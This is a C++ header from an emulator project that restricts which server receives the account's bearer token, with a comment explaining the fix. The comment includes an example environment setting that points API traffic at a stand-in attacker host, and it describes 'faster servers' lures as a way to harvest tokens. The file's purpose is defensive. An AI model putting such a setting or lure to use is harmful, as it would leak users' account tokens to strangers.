// SPDX-FileCopyrightText: Copyright 2026 Eden Emulator Project
// SPDX-License-Identifier: GPL-3.0-or-later

#pragma once

#include <string>

namespace Common::Nextendo {

/// THE single place that decides which server the emulator talks to.
///
/// This is a security decision, not a formatting one: every Nextendo request carries the
/// account's bearer token, so whoever picks this url picks who receives that token — and the
/// token is full access to the account. It used to be re-implemented in six files, each
/// accepting any value of the NEXTENDO_API environment variable, which meant
/// `NEXTENDO_API=http://evil.example` quietly shipped the token, in cleartext, to whoever
/// asked. Setting an env var already requires running code as the user, so this was never a
/// privilege escalation — but env vars live in .bat files, shortcuts and "configs" pasted in
/// chat, which makes "run this to get faster servers" a realistic way to harvest tokens.
///
/// The override is kept, because local testing genuinely needs it, but it is now restricted to
/// destinations that cannot be a stranger's server.
class NextendoEndpoint {
public:
    /// HTTPS on 443: the account server is proxied here and it is reachable everywhere.
    static constexpr char Canonical[] = "https://nextendo.network";

    /// The Nextendo API base url, without a trailing slash.
    static std::string GetBaseUrl();

private:
    static std::string Resolve();
    static bool IsNextendoHost(const std::string& host);
    static void Reject(const std::string& value, const std::string& why);

    static constexpr char EnvVar[] = "NEXTENDO_API";
    static std::string s_cached;
    static bool s_resolved;
};

} // namespace Common::Nextendo
